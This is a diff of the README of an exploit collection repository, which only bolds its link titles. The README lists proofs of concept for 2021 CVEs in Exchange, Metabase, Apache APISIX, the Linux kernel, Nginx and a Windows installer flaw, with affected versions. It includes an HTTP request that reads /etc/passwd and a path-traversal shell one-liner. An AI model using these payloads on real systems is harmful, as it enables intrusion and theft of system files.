@@ -5,29 +5,29 @@ expbox is an exploit code collection repository
 
 
 ### List
-[CVE-2021-41349 Exchange XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021-41349-poc.py)
+**[CVE-2021-41349 Exchange XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021-41349-poc.py)**
 ```
 <= Exchange 2013 update 23
 <= Exchange 2016 update 22
 <= Exchange 2019 update 11
 ```
-[CVE-2021–3945 Django-helpdesk stored XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021%E2%80%933945-poc.txt)
+**[CVE-2021–3945 Django-helpdesk stored XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021%E2%80%933945-poc.txt)**
 ```
 <= 0.3.0
 ```
 
-[CVE-2021-37580 Apache ShenYu 2.3.0/2.4.0 authentication bypass](https://github.com/0x0021h/expbox/blob/main/cve-2021-37580-poc.py)
+**[CVE-2021-37580 Apache ShenYu 2.3.0/2.4.0 authentication bypass](https://github.com/0x0021h/expbox/blob/main/cve-2021-37580-poc.py)**
 ```
 Ref: https://github.com/fengwenhua/CVE-2021-37580
 ```
 
 
-[Hadoop Yarn RPC RCE](https://github.com/0x0021h/expbox/blob/main/Hadoop%20Yarn%20RPC%20RCE.md)
+**[Hadoop Yarn RPC RCE](https://github.com/0x0021h/expbox/blob/main/Hadoop%20Yarn%20RPC%20RCE.md)**
 ```
 Ref: https://github.com/cckuailong/YarnRpcRCE
 ```
 
-[CVE-2021-41277 MetaBase Arbitrary File Read](https://github.com/0x0021h/expbox/blob/main/CVE-2021-41277.yaml)
+**[CVE-2021-41277 MetaBase Arbitrary File Read](https://github.com/0x0021h/expbox/blob/main/CVE-2021-41277.yaml)**
 ```
 MetaBase < 0.40.5
 1.0.0 <= MetaBase < 1.40.5
@@ -41,33 +41,33 @@ PoC:
 GET /api/geojson?url=file:/etc/passwd HTTP/1.1
 ```
 
-[CVE-2021-42321 Exchange Post-Auth RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-42321.py)
+**[CVE-2021-42321 Exchange Post-Auth RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-42321.py)**
 ```
 <= Exchange 2016 update 22
 <= Exchange 2019 update 11
 ```
 
-[Windows 0day](https://github.com/0x0021h/expbox/blob/main/InstallerFileTakeOver.exe)
+**[Windows 0day - InstallerFileTakeOver](https://github.com/0x0021h/expbox/blob/main/InstallerFileTakeOver.exe)**
 ![image](https://user-images.githubusercontent.com/92664048/142796024-a46e8a46-90d1-42ed-8cf2-42127fb65da3.png)
 ```
 Ref:https://github.com/klinix5/InstallerFileTakeOver
 ```
 
-CVE-2021-43557 Apache APISIX: Path traversal in request_uri variable
+**CVE-2021-43557 Apache APISIX: Path traversal in request_uri variable**
 ```
 #/bin/bash
 
 kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H 'Host: app.test'
 ```
 
-[CVE-2021-43267 Linux Kernel TIPC RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-43267.c)
+**[CVE-2021-43267 Linux Kernel TIPC RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-43267.c)**
 ```
 5.10-rc1 < Linux kernel < 5.15
 ```
 
 Reference: https://haxx.in/posts/pwning-tipc/
 
-[Nginx 0.7.0 to 1.17.9 Host injection](https://github.com/0x0021h/expbox/blob/main/nginx%20%200.7.0%20to%201.17.9%20Host%20injection.md)
+**[Nginx 0.7.0 to 1.17.9 Host injection](https://github.com/0x0021h/expbox/blob/main/nginx%20%200.7.0%20to%201.17.9%20Host%20injection.md)**
 ```
 Ref: https://twitter.com/infosec_90/status/1464337963240861702
 ```
